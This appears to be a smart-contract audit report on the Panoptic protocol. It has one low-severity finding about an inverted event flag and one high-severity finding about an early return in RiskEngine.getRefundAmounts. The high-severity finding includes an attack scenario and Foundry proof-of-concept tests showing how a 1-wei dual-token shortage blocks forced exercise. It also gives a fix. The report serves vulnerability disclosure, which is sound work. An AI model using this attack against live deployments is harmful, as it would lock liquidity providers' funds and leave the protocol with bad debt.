# L-01 Incorrect GuardianSafeModeUpdated event parameter on unlock

## Description:
The unlockPool function emits GuardianSafeModeUpdated(true) even though it removes the forced safe-mode lock. According to the event documentation, lockMode = true indicates that safe mode is forcibly locked, while false indicates that the lock is lifted. This results in an event that signals the opposite of the actual state transition.

## Impact:
Off-chain systems relying on events (monitoring, frontends, indexers) may incorrectly believe the pool remains forcibly locked after it has been unlocked.

## Recommendation:
Emit GuardianSafeModeUpdated(false) when unlocking the pool.

Low / Informational


---

# `RiskEngine.getRefundAmounts` early return enables permanent DoS of Force Exercise via dual-token shortages

Severity: High

## **Vulnerability Details**

The `getRefundAmounts` function in `RiskEngine.sol` is designed to calculate the necessary asset transfers (swaps) to cover a user's shortages during a forced exercise. The function is supposed to check for shortages in `token0` and `token1` sequentially and return a consolidated payment instruction (`LeftRightSigned`).

However, the function contains a critical **Control Flow Error (Early Return)**.

If a shortage is detected in `token0` (`balanceShortage > 0`), the function calculates the necessary adjustment and **immediately returns**, rendering the logic that checks for `token1` shortages **unreachable**.

`_forceExercise` assumes the returned LeftRightSigned represents a fully reconciled state for both assets, which is violated by the early return.
[RiskEngine.sol#L301-L388](https://github.com/code-423n4/2025-12-panoptic/blob/fe557748210a529ae414d7c487b6514be0d9e220/contracts/RiskEngine.sol#L301-L388)
```solidity
// contracts/RiskEngine.sol

    function getRefundAmounts(...) {
        // ... calculation for token0 ...

        if (balanceShortage > 0) {
>@          return LeftRightSigned... // <--- CRITICAL BUG: Returns immediately
        }

        // ... calculation for token1 ...
        // This code is UNREACHABLE if token0 had a shortage, even if token1 shortage is larger
        int128 fees1 = fees.leftSlot();
        
        // ...
    }

```

## **Attack Scenario**

1. **State Setup:** A user (Charlie) holds a valuable option position (making him **Solvent**), but withdraws or temporarily moves collateral (while remaining solvent) to create a "dust" shortage (e.g., -1 wei) in both `token0` and `token1`.
2. **Trigger:** A liquidator (Alice) attempts to `forceExercise` Charlie's position.
3. **Logic Failure:** `dispatchFrom` sees Charlie is solvent and calls `_forceExercise`. The `RiskEngine` detects the `token0` shortage, calculates the fix, and returns early. **The `token1` shortage is ignored.**
4. **Execution Revert:** The transaction proceeds to `PanopticPool._forceExercise`. The contract attempts to transfer `token1` from Charlie to settle the exercise fee or return liquidity.
5. **Outcome:** Since Alice was not instructed to cover Charlie's `token1` shortage, and Charlie has a negative balance (shortage), the ERC20 transfer (or internal accounting subtraction) fails. **The transaction reverts.**

Note：
The current implementation implicitly assumes that an account can be short of at most one asset at a time during forced exercise.

However, this invariant is neither enforced nor documented, and is not guaranteed by any precondition in dispatchFrom, _forceExercise, or CollateralTracker.

Given that solvency is evaluated on net asset value across ticks rather than per-asset balances, accounts that are solvent but illiquid in both token0 and token1 are reachable states under normal protocol operation.


## **Severity & Impact**

This vulnerability allows malicious users (or users in specific market conditions) to permanently block `forceExercise` .

* **DoS Attack:** An attacker can immunize their position against being closed by maintaining a trivial shortage (e.g., 1 wei) in both `token0` and `token1`.
* **Locked Liquidity:** Liquidity providers (LPs) cannot reclaim their borrowed assets from these positions, leading to permanent fund locking.
* **Protocol Insolvency Risk:** If a user is theoretically solvent (high position value) but refuses to settle debts, the protocol accumulates bad debt that cannot be cleared.


## **Proof of Concept**

Add the following functions to the `PanopticPool.t.sol` and 

```
forge test --match-test test_PoC_EarlyReturn_DoubleShortage -vvv
forge test --match-test test_PoC_EarlyReturn_Dust_DoS -vvv 
```
1. test_PoC_EarlyReturn_DoubleShortage

This test mathemaitcally proves that the `token1` debt logic is skipped entirely. We create a user account with shortages in both `token0` and `token1`. We intentionally make the `token1` shortage massive (significantly larger than any swap credit derived from `token0`). If the logic were correct, the huge debt would outweight the credit, resulting in a negative value (requiring the liquidatore to pay). The test asserts that the returned value is positive. This confirmed that the massive `token1` debt was effectively treated as zero (ignored) due to the early return.

```solidity
    function test_PoC_EarlyReturn_DoubleShortage() public {
        _initPool(0);

        // 1. Get current price to calculate appropriate shortage amounts
        uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(currentTick);

        // 2. Create Token0 Shortage (The bait to trigger Early Return)
        // Amount doesn't need to be large, just enough to trigger if (shortage0 > 0)
        uint256 shortage0 = 1000;
        uint256 balance0 = uint256(type(uint248).max) - shortage0;

        // 3. Create Huge Token1 Shortage (Core verification point)
        // We calculate the swap value in Token1 corresponding to the shortage in Token0
        uint256 assetShortage0 = ct0.convertToAssets(shortage0);
        uint256 swapValueT1 = PanopticMath.convert0to1RoundingUp(assetShortage0, sqrtPriceX96);
        
        // Key step: Set Token1 shortage >>> swap value
        // For example, 2x the swap value
        uint256 shortage1 = swapValueT1 * 2 + 10000; 
        uint256 balance1 = uint256(type(uint248).max) - shortage1;

        // Apply account state
        deal(address(ct0), Charlie, balance0);
        deal(address(ct1), Charlie, balance1);

        // 4. Call getRefundAmounts
        LeftRightSigned fees = LeftRightSigned.wrap(0);
        LeftRightSigned refundAmounts = re.getRefundAmounts(
            Charlie,
            fees,
            currentTick, // Ensure passed tick matches internal calculation
            ct0,
            ct1
        );

        int128 actualRefund1 = refundAmounts.leftSlot();

        console2.log("--- Vulnerability Proof ---");
        console2.log("Swap Credit (Alice receives): ", swapValueT1);
        console2.log("Token1 Debt (Alice pays)    : ", shortage1);
        console2.log("Actual Refund1              : ", actualRefund1);

        // 5. Verify Vulnerability
        // Expected logic: Refund1 = SwapCredit - Debt
        // Since Debt (Shortage1) > SwapCredit, result should be negative (Alice pays)
        // 
        // Buggy logic: Refund1 = SwapCredit (Positive)
        // Because Debt was skipped due to Early Return

        assertGt(actualRefund1, 0, "VULNERABILITY CONFIRMED: Refund1 is POSITIVE, meaning the huge debt was IGNORED.");
        
        // Further verify if the value is close to SwapCredit (allowing for minor precision error)
        // This proves the result is indeed purely the SwapCredit
        uint256 diff = uint256(int256(actualRefund1) - int256(swapValueT1));
        if (diff > 100) { // Tolerate minor precision error
             console2.log("Diff: ", diff);
        }
        // We only assert it's positive, which is sufficient to prove the huge shortage1 was not subtracted
    }
```
Console output:
```text
[PASS] test_PoC_EarlyReturn_DoubleShortage() (gas: 14417271)
Logs:
  Bound result 0
  b0 20282409603651670423947251286015
  b1 20282409603651670423947251286015
  --- Vulnerability Proof ---
  Swap Credit (Alice receives):  340360936403
  Token1 Debt (Alice pays)    :  680721882806
  Actual Refund1              :  340360936403 
```

2. `test_PoC_EarlyReturn_DoS_Attack`

```
  Attack Setup:
    Attacker creates minimal dual shortage:
    - Token0 shortage: 1 wei
    - Token1 shortage: 1 wei
    - Attack cost: ~0 (dust amount)
  
  RiskEngine Response
    Refund0: -1
    Refund1: 0
  
  Result:
   PASS: Token0 shortage detected -> liquidator pays
   FAIL: Token1 shortage ignored -> nobody pays
  
  When forceExercise executes:
    1. Liquidator covers token0 shortage
    2. System tries to deduct token1 from victim
    3. Victim has insufficient balance (1 wei short)
    4. Transaction REVERTS
  
  Impact:
    -> Position immune to liquidation
    -> Funds permanently locked
    -> Attack cost: 2 wei (negligible)
```

```solidity
    function test_PoC_EarlyReturn_DoS_Attack() public {
        _initPool(0);

        address victim = address(0x999);
 
        deal(address(ct0), victim, type(uint248).max - 1);
        deal(address(ct1), victim, type(uint248).max - 1);

        console2.log("Attack Setup:");
        console2.log("  Attacker creates minimal dual shortage:");
        console2.log("  - Token0 shortage: 1 wei");
        console2.log("  - Token1 shortage: 1 wei");
        console2.log("  - Attack cost: ~0 (dust amount)");
        console2.log("");

        LeftRightSigned refundAmounts = re.getRefundAmounts(
            victim,
            LeftRightSigned.wrap(0),
            currentTick,
            ct0,
            ct1
        );

        int128 refund0 = refundAmounts.rightSlot();
        int128 refund1 = refundAmounts.leftSlot();

        console2.log("=== RiskEngine Response ===");
        console2.log("  Refund0:", refund0);
        console2.log("  Refund1:", refund1);
        console2.log("");
        
        assertLt(refund0, 0, "Token0 shortage detected");
        assertEq(refund1, 0, "CRITICAL: Token1 shortage ignored");
    }  
```

Console output
```text
[PASS] test_PoC_EarlyReturn_DoS_Attack() (gas: 14408423)
Logs:
  Bound result 0
  b0 20282409603651670423947251286015
  b1 20282409603651670423947251286015
  Attack Setup:
    Attacker creates minimal dual shortage:
    - Token0 shortage: 1 wei
    - Token1 shortage: 1 wei
    - Attack cost: ~0 (dust amount)
  
  === RiskEngine Response ===
    Refund0: -1
    Refund1: 0
```

## **Recommended Mitigation**

Remove the early `return` statements. Instead, use a variable to accumulate the adjustments for both tokens, and return the consolidated result at the very end of the function.

Ensure both asset shortages are always evaluated within a single execution path.

```diff
    function getRefundAmounts(...) external view returns (LeftRightSigned) {
        // ... (setup) ...
        
+       // Use an accumulator for the final fees
+       LeftRightSigned finalFees = fees;

        // Check Token0
        // ... calculation ...
        if (balanceShortage > 0) {
-           return LeftRightSigned....
+           // Accumulate the adjustments
+           finalFees = finalFees.addToRightSlot(...).addToLeftSlot(...);
        }

        // Check Token1
        // ... calculation ...
        // Note: Use finalFees here to account for adjustments made in the token0 block
        int128 fees1 = finalFees.leftSlot(); 
        // ... recalculate balanceShortage based on new fees1 ...

        if (balanceShortage > 0) {
-            return LeftRightSigned....
+            // Accumulate the adjustments
+            finalFees = finalFees.addToRightSlot(...).addToLeftSlot(...);
        }

+       return finalFees;
    }

```
---

